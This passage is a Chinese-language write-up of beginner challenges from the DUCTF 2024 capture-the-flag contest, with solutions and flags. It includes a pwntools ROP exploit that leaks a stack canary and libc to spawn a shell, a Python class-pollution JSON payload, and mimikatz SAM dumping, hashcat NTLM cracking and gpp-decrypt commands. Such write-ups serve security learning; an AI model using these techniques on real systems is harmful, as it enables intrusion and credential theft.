class="line">name(&quot;A&quot;*0x51+&quot;P&quot;*7)</span><br><span class="line">hello()</span><br><span class="line">canary=u64(io.recv(8))-0x0a</span><br><span class="line">print hex(canary)</span><br><span class="line"></span><br><span class="line">name(&quot;A&quot;*0x60+&quot;P&quot;*7)</span><br><span class="line">hello()</span><br><span class="line">io.recv(1)</span><br><span class="line">libc_addr=(u64(io.recv(6)+2*&quot;\x00&quot;))+48</span><br><span class="line">libc_addr=libc_addr-0x29dc0</span><br><span class="line">print hex(libc_addr)</span><br><span class="line">ret=libc_addr+0x0000000000029139</span><br><span class="line">system=libc_addr+0x50d70</span><br><span class="line">pop_rdi=libc_addr+0x000000000002a3e5</span><br><span class="line">bin_sh=libc_addr+0x1d8678</span><br><span class="line">name(&quot;A&quot;*0x58+p64(canary)+&quot;A&quot;*0x8+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))</span><br><span class="line">io.sendline(&quot;3&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><strong>DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}</strong></p>
+<h2 id="discord"><a href="#discord" class="headerlink" title="discord"></a>discord</h2><p>第一部分在#team-search：DUCTF{f1r57<br>第二部分在#opt-in-updates：_0f_m4ny}<br><strong>DUCTF{f1r57_0f_m4ny}</strong></p>
+<h2 id="survey"><a href="#survey" class="headerlink" title="survey"></a>survey</h2><p>问卷题，做就完了</p>
+<p><strong>DUCTF{hop3_u_had_fun}</strong></p>
+<h2 id="co2"><a href="#co2" class="headerlink" title="co2"></a>co2</h2><p>python原型链污染</p>
+<p>审计代码，快进到：</p>
+<p><img src="/images/migrated/18288730/12.png"></p>
+<p>发现根目录下能直接污染到flag值（笑）</p>
+<p>根目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;__init__&quot;: &#123;</span><br><span class="line">    &quot;__globals__&quot;: &#123;</span><br><span class="line">&quot;flag&quot;:&quot;true&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接设置flag为true，访问&#x2F;get_flag即可</p>
+<p><strong>DUCTF{<em>cl455_p0lluti0n_ftw</em>}</strong></p>
+<h2 id="Baby’s-First-Forensics"><a href="#Baby’s-First-Forensics" class="headerlink" title="Baby’s First Forensics"></a>Baby’s First Forensics</h2><p>下载，随便点开一个html包</p>
+<p><img src="/images/migrated/18288730/13.png"></p>
+<p>发现header中直接就有工具名称和版本</p>
+<p><strong>DUCTF{Nikto_2.1.6}</strong></p>
+<h2 id="SAM-I-AM"><a href="#SAM-I-AM" class="headerlink" title="SAM I AM"></a>SAM I AM</h2><p>mimikatz+hashcat一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.bak /system:system.bak</span><br></pre></td></tr></table></figure>
+
+<p>直接出administrator的hash：476b4dddbbffde29e739b618580adb1e</p>
+<p>hashcat跑就完了o(<em>￣▽￣</em>)o</p>
+<p>将476b4dddbbffde29e739b618580adb1e写入1.ntlm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat --force -m 1000 1.ntlm /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>DUCTF{!checkerboard1}</strong></p>
+<h2 id="offtheramp"><a href="#offtheramp" class="headerlink" title="offtheramp"></a>offtheramp</h2><p>exiftool直接出经纬度</p>
+<p><img src="/images/migrated/18288730/14.png"></p>
+<p>google地图看就完了</p>
+<p><strong>DUCTF{Olivers_Hill_Boat_Ramp}</strong></p>
+<h2 id="badpolicy"><a href="#badpolicy" class="headerlink" title="badpolicy"></a>badpolicy</h2><p>一眼组策略，直接找cpassword</p>
+<p>发现在\badpolicies\rebels.ductf\Policies{B6EF39A3-E84F-4C1D-A032-00F042BE99B5}\Machine\Preferences\Groups\groups.xml中</p>
+<p><img src="/images/migrated/18288730/15.png"></p>
+<p>gpp-decrypt一把梭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpp-decrypt B+iL/dnbBHSlVf66R8HOuAiGHAtFOVLZwXu0FYf+jQ6553UUgGNwSZucgdz98klzBuFqKtTpO1bRZIsrF8b4Hu5n6KccA7SBWlbLBWnLXAkPquHFwdC70HXBcRlz38q2</span><br></pre></td></tr></table></figure>
+
+<p><strong>DUCTF{D0n7_Us3_P4s5w0rds_1n_Gr0up_P0l1cy}</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Beginner"><span class="toc-number">1.</span> <span class="toc-text">Beginner</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#tldr-please-summarise"><span class="toc-number">1.1.</span> <span class="toc-text">tldr please summarise</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#parrot-the-emu"><span class="toc-number">1.2.</span> <span class="toc-text">parrot the emu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sun-Zi%E2%80%99s-Perfect-Math"><span class="toc-number">1.3.</span> <span class="toc-text">Sun Zi’s Perfect Math</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zoo-feedback-form"><span class="toc-number">1.4.</span> <span class="toc-text">zoo feedback form</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shufflebox"><span class="toc-number">1.5.</span> <span class="toc-text">shufflebox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#number-mashing"><span class="toc-number">1.6.</span> <span class="toc-text">number mashing</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Intercepted-Transmissions"><span class="toc-number">1.7.</span> <span class="toc-text">Intercepted Transmissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vector-overflow"><span class="toc-number">1.8.</span> <span class="toc-text">vector overflow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yawa"><span class="toc-number">1.9.</span> <span class="toc-text">yawa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#discord"><span class="toc-number">1.10.</span> <span class="toc-text">discord</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#survey"><span class="toc-number">1.11.</span> <span class="toc-text">survey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#co2"><span class="toc-number">1.12.</span> <span class="toc-text">co2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby%E2%80%99s-First-Forensics"><span class="toc-number">1.13.</span> <span class="toc-text">Baby’s First Forensics</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SAM-I-AM"><span class="toc-number">1.14.</span> <span class="toc-text">SAM I AM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#offtheramp"><span class="toc-number">1.15.</span> <span class="toc-text">offtheramp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#badpolicy"><span class="toc-number">1.16.</span> <span class="toc-text">badpolicy</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&text=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&is_video=false&description=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DUCTF 2024 EICS1 beginner wp&body=Check out this article: https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&title=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&name=DUCTF 2024 EICS1 beginner wp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-07-07-ductf-2024-eics1-beginner-wp/&t=DUCTF 2024 EICS1 beginner wp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2026
+    LamentXU
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
